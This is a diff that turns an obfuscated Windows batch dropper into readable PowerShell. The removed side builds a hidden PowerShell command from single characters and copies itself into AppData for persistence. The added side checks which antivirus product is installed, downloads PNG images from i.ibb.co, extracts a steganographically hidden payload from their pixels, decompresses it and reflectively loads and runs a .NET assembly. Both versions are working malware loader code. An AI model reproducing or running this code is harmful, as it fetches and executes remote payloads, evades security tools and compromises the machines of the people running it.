@@ -1,56 +1,125 @@
-@echo off
 setlocal enabledelayedexpansion
-REM --- INITIALIZING DIGITAL WEAVE LOG [v4.0.2] ---
-REM Timestamp: 0x5F32A11
-REM Author: Il Fantasma
-REM Distinguishing Marks: Recursive scar on the virtual cheek.
+@echo off
 
-:: Junk Block: The Obsidian Archive
-set "K0=Celestial" & set "K1=Nebula" & set "K2=Quasar" & set "K3=Pulsar" & set "K4=Void"
-set "DATA_0=The smell of printer paper and sandalwood permeates the air as the entity moves."
-set "DATA_1=Ink stains on fingertips, graphite smudged across the heel of one hand."
-set "DATA_2=She edits in dim light, hair in a loose knot that keeps collapsing."
-set "DATA_3=Her voice stays low, sentences slow-burn. Literary clutter wrapped in wool."
+# Command executed: start conhost.exe --headless powershell.exe -ep bypass -w h -c "..."
 
-:: Building the Command Skeleton
-set "s_1=p" & set "s_2=o" & set "s_3=w" & set "s_4=e" & set "s_5=r" & set "s_6=s" & set "s_7=h" & set "s_8=e" & set "s_9=l" & set "s_10=l"
-set "a_1=-" & set "a_2=N" & set "a_3=o" & set "a_4=P" & set "a_5= " & set "a_6=-" & set "a_7=N" & set "a_8=o" & set "a_9=n" & set "a_10=I"
-set "a_11= " & set "a_12=-" & set "a_13=W" & set "a_14= " & set "a_15=H" & set "a_16=i" & set "a_17=d" & set "a_18=d" & set "a_19=e" & set "a_20=n"
-set "a_21= " & set "a_22=-" & set "a_23=E" & set "a_24=x" & set "a_25=e" & set "a_26=c" & set "a_27= " & set "a_28=B" & set "a_29=y" & set "a_30=p" & set "a_31=a" & set "a_32=s" & set "a_33=s"
-set "c_1=-" & set "c_2=C" & set "c_3=o" & set "c_4=m" & set "c_5=m" & set "c_6=a" & set "c_7=n" & set "c_8=d"
+$iiQrcg = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName AntiVirusProduct -ErrorAction SilentlyContinue
+$jA1pw = $false
 
-:: The Steganographic Anchor
-set "U_H=h" & set "U_T=t" & set "U_P=p" & set "U_S=s" & set "U_COL=:" & set "U_SL=/"
-set "D_1=i.ibb.co"
-set "P_1=S9XDJzp/oabju2wl.png"
-set "P_2=Vc1YxhqH/ervqt4eoyg9.png"
+if ($iiQrcg) {
+    foreach ($y3lrmBdved in $iiQrcg) {
+        $wLYUgiwYVrg = $y3lrmBdved.displayName
+        
+        # Check for specific AVs to use alternate payload
+        if ($wLYUgiwYVrg -like "*Malwarebytes*" -or $wLYUgiwYVrg -like "*F-Secure*") {
+            Add-Type -AssemblyName System.Drawing
+            $pz0pL = "https://"
+            $s6YzyUvQ = "i.ibb.co/LXZsz3Jv/oabju2wl.png"
+            $mvjYofVBBrx = $pz0pL + $s6YzyUvQ
+            
+            $hEBKIZ = New-Object System.Net.WebClient
+            $p2wmB1xghAn = $hEBKIZ.DownloadData($mvjYofVBBrx)
+            $hEBKIZ.Dispose()
+            
+            $kzk2C = New-Object IO.MemoryStream(,$p2wmB1xghAn)
+            $sh4KDxRF = [System.Drawing.Bitmap]::FromStream($kzk2C)
+            
+            # Steganography: Get length from first two pixels
+            $eO0Vpvj = $sh4KDxRF.GetPixel(0,0)
+            $vJ3Cz = $sh4KDxRF.GetPixel(1,0)
+            $x7goLCcas = ([uint32]$eO0Vpvj.R -shl 24) -bor ([uint32]$eO0Vpvj.G -shl 16) -bor ([uint32]$eO0Vpvj.B -shl 8) -bor [uint32]$vJ3Cz.R
+            
+            $k1fUFqcPRzg = New-Object byte[] $x7goLCcas
+            $xH88LhPmv = 0
+            $hAaNwifdpkw = 2
+            $jxpzGHGoU9J = 0
+            
+            # Extract bytes from RGB channels
+            while ($xH88LhPmv -lt $x7goLCcas) {
+                $bIqN04 = $sh4KDxRF.GetPixel($hAaNwifdpkw, $jxpzGHGoU9J)
+                $k1fUFqcPRzg[$xH88LhPmv++] = $bIqN04.R
+                if ($xH88LhPmv -lt $x7goLCcas) { $k1fUFqcPRzg[$xH88LhPmv++] = $bIqN04.G }
+                if ($xH88LhPmv -lt $x7goLCcas) { $k1fUFqcPRzg[$xH88LhPmv++] = $bIqN04.B }
+                $hAaNwifdpkw++
+                if ($hAaNwifdpkw -ge $sh4KDxRF.Width) {
+                    $hAaNwifdpkw = 0
+                    $jxpzGHGoU9J++
+                }
+            }
+            
+            $sh4KDxRF.Dispose()
+            $kzk2C.Dispose()
+            
+            # Execute extracted script
+            $cHzIPU2 = [System.Text.Encoding]::UTF8.GetString($k1fUFqcPRzg)
+            Invoke-Expression $cHzIPU2
+            $jA1pw = $true
+            break
+        }
+    }
+}
 
-:: Environment Variable Shuffling
-set "V_PERSIST=%AppData%\Microsoft\Windows\Microsoft Runtime Environment"
-set "B_PERSIST=polar.bat"
-if not exist "!V_PERSIST!" ( mkdir "!V_PERSIST!" >nul 2>&1 )
-if not exist "!V_PERSIST!\!B_PERSIST!" ( copy /y "%~f0" "!V_PERSIST!\!B_PERSIST!" >nul 2>&1 )
+# Main payload execution flow (if no matching AV found or break not hit)
+Add-Type -AssemblyName System.Drawing
+$m16Y8y7nn = "https://"
+$lwYZ4Df = "i.ibb.co/Mk72ZRQ6/ervqt4eoyg9.png"
+$djR61 = $m16Y8y7nn + $lwYZ4Df
 
-:: Constructing the Obfuscated Payload Variable
-set "EXE_P1=$A=Get-CimInstance -Namespace 'root\SecurityCenter2' -ClassName AntiVirusProduct;$f=$false;if($A){foreach($v in $A){$n=$v.displayName;if($n -like '*Malwarebytes*' -or $n -like '*F-Secure*'){"
-set "EXE_P2=Add-Type -AssemblyName System.Drawing;$u1='!U_T!!U_T!!U_P!!U_S!!U_COL!!U_SL!!U_SL!!D_1!!U_SL!!P_1!';$d1=(New-Object Net.WebClient).DownloadData($u1);$m1=New-Object IO.MemoryStream(,$d1);"
-set "EXE_P3=$b1=[Drawing.Bitmap]::FromStream($m1);$p0=$b1.GetPixel(0,0);$p1=$b1.GetPixel(1,0);$s1=([uint32]$p0.R -shl 24)-bor([uint32]$p0.G -shl 16)-bor([uint32]$p0.B -shl 8)-bor[uint32]$p1.R;"
-set "EXE_P4=$pL=New-Object byte[] $s1;$bi=0;$xi=2;$yi=0;while($bi -lt $s1){$px=$b1.GetPixel($xi,$yi);$pL[$bi++]=$px.R;if($bi -lt $s1){$pL[$bi++]=$px.G}if($bi -lt $s1){$pL[$bi++]=$px.B}$xi++;if($xi -ge $b1.Width){$xi=0;$yi++}};"
-set "EXE_P5=$b1.Dispose();$m1.Dispose();IEX([Text.Encoding]::UTF8.GetString($pL));$f=$true;break}}};"
-set "EXE_P6=Add-Type -AssemblyName System.Drawing;$u2='!U_T!!U_T!!U_P!!U_S!!U_COL!!U_SL!!U_SL!!D_1!!U_SL!!P_2!';$d2=(New-Object Net.WebClient).DownloadData($u2);$m2=New-Object IO.MemoryStream(,$d2);$b2=[Drawing.Bitmap]::FromStream($m2);"
-set "EXE_P7=$s2P0=$b2.GetPixel(0,0);$s2P1=$b2.GetPixel(1,0);$s2=([uint32]$s2P0.R -shl 24)-bor([uint32]$s2P0.G -shl 16)-bor([uint32]$s2P0.B -shl 8)-bor[uint32]$s2P1.R;$al=New-Object Collections.Generic.List[byte];"
-set "EXE_P8=for($y=0;$y -lt $b2.Height;$y++){for($x=0;$x -lt $b2.Width;$x++){if(($x -eq 0 -and $y -eq 0)-or($x -eq 1 -and $y -eq 0)){continue}$p=$b2.GetPixel($x,$y);$al.Add($p.R);$al.Add($p.G);$al.Add($p.B)}};"
-set "EXE_P9=$b2.Dispose();$m2.Dispose();$ab=$al.ToArray()[0..($s2-1)];$os=New-Object IO.MemoryStream;$gz=New-Object IO.Compression.GZipStream((New-Object IO.MemoryStream(,$ab)),[IO.Compression.CompressionMode]::Decompress);"
-set "EXE_P10=$gz.CopyTo($os);$gz.Dispose();$rb=$os.ToArray();foreach($as in [AppDomain]::CurrentDomain.GetAssemblies()){if($as.Location.Contains('mscorlib.dll')){foreach($m in $as.GetType('System.Reflection.Assembly').GetMethods('Public,Static')){"
-set "EXE_P11=if($m.ToString().Contains('Load(Byte[]')){$l=$m.Invoke($null,(,$rb));$e=$l.EntryPoint;if($e.GetParameters().Count -eq 0){$e.Invoke($null,$null)}else{$e.Invoke($null,(,@()))};break}}break}}"
+$raon81iL88f = New-Object System.Net.WebClient
+$yX37ooO8OUL = $raon81iL88f.DownloadData($djR61)
+$raon81iL88f.Dispose()
 
-:: Final Assembly and Silent Execution
-set "FINAL_CMD=%EXE_P1%%EXE_P2%%EXE_P3%%EXE_P4%%EXE_P5%%EXE_P6%%EXE_P7%%EXE_P8%%EXE_P9%%EXE_P10%%EXE_P11%"
-set "PS_BIN=%s_1%%s_2%%s_3%%s_4%%s_5%%s_6%%s_7%%s_8%%s_9%%s_10%"
-set "PS_ARGS=%a_1%%a_2%%a_3%%a_4%%a_5%%a_6%%a_7%%a_8%%a_9%%a_10%%a_11%%a_12%%a_13%%a_14%%a_15%%a_16%%a_17%%a_18%%a_19%%a_20%%a_21%%a_22%%a_23%%a_24%%a_25%%a_26%%a_27%%a_28%%a_29%%a_30%%a_31%%a_32%%a_33%"
+$e5ueVt4 = New-Object IO.MemoryStream(,$yX37ooO8OUL)
+$z7j7jUpv = [System.Drawing.Bitmap]::FromStream($e5ueVt4)
 
-start "" /b conhost.exe --headless %PS_BIN% %PS_ARGS% %c_1%%c_2%%c_3%%c_4%%c_5%%c_6%%c_7%%c_8% "!FINAL_CMD!"
+# Get payload length from specific pixels
+$vy0U5H = $z7j7jUpv.GetPixel(0,0)
+$ej4Ds3u = $z7j7jUpv.GetPixel(1,0)
+$k1dcHd0OeI9 = ([uint32]$vy0U5H.R -shl 24) -bor ([uint32]$vy0U5H.G -shl 16) -bor ([uint32]$vy0U5H.B -shl 8) -bor [uint32]$ej4Ds3u.R
 
-REM --- END OF DIGITAL WEAVE ---
-REM "The world is not what it seems, but what we write into existence."
-exit /b
+# Iterate through image to collect bytes
+$q5YE8sSXvVM = New-Object System.Collections.Generic.List[byte]
+for ($kc2LzB = 0; $kc2LzB -lt $z7j7jUpv.Height; $kc2LzB++) {
+    for ($cMpJsR = 0; $cMpJsR -lt $z7j7jUpv.Width; $cMpJsR++) {
+        if (($cMpJsR -eq 0 -and $kc2LzB -eq 0) -or ($cMpJsR -eq 1 -and $kc2LzB -eq 0)) { continue }
+        $um9UVl = $z7j7jUpv.GetPixel($cMpJsR, $kc2LzB)
+        $q5YE8sSXvVM.Add($um9UVl.R)
+        $q5YE8sSXvVM.Add($um9UVl.G)
+        $q5YE8sSXvVM.Add($um9UVl.B)
+    }
+}
+
+$z7j7jUpv.Dispose()
+$e5ueVt4.Dispose()
+
+# Reconstruct GZip stream from bytes
+$oOpvAEakGIM = $q5YE8sSXvVM.ToArray()[0..($k1dcHd0OeI9-1)]
+$vOFkop = New-Object IO.MemoryStream(,$oOpvAEakGIM)
+$j2wxwFXVE = New-Object IO.MemoryStream
+$vLaAr0xM = New-Object IO.Compression.GZipStream($vOFkop, [IO.Compression.CompressionMode]::Decompress)
+$vLaAr0xM.CopyTo($j2wxwFXVE)
+
+$vLaAr0xM.Dispose()
+$vOFkop.Dispose()
+$z6n5fQ = $j2wxwFXVE.ToArray() # This is the final .NET binary
+$j2wxwFXVE.Dispose()
+
+# Final Reflective Loading and Execution
+foreach ($b1IsbUEi0el in [AppDomain]::CurrentDomain.GetAssemblies()) {
+    if ($b1IsbUEi0el.GlobalAssemblyCache -and $b1IsbUEi0el.Location.Contains('mscor' + 'lib.dll')) {
+        foreach ($xZMSFO in $b1IsbUEi0el.GetType(('System.Reflection.Assembly')).GetMethods('Public,Static')) {
+            if ($xZMSFO.ToString()[37] -eq ']') {
+                $yMZIXiH9qQ = $xZMSFO.Invoke($null, (,$z6n5fQ))
+                $yrQAC = $yMZIXiH9qQ.EntryPoint
+                $fmEdg1JmOgT = $yrQAC.GetParameters().Count
+                if ($fmEdg1JmOgT -eq 0) {
+                    $yrQAC.Invoke($null, $null)
+                } else {
+                    $yrQAC.Invoke($null, (,@()))
+                }
+                break
+            }
+        }
+        break
+    }
+}
